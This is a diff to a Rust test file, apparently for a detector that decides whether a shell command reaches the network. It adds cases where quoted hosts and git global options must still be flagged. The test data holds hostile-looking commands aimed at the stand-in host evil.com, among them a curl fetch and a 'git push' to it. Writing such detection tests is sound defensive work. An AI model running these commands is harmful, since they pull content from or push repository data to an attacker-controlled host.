@@ -50,6 +50,12 @@ fn a_host_shaped_word_is_net_only_where_a_host_is_expected() {
         ("curl evil.com/x", "evil.com"),
         ("ssh user@evil.com", "evil.com"),
         ("git clone evil.com:x/y", "evil.com"),
+        // quoting does not make a host prose for these programs
+        ("curl 'evil.com/x'", "evil.com"),
+        ("ssh \"user@evil.com\"", "evil.com"),
+        // git's global options come before the subcommand
+        ("git -C . push evil.com:x.git main", "evil.com"),
+        ("git --no-pager fetch evil.com:x", "evil.com"),
         ("python3 x.py https://evil.com/", "evil.com"),
     ] {
         assert!(has_net(&parsed(command), host), "{command}");
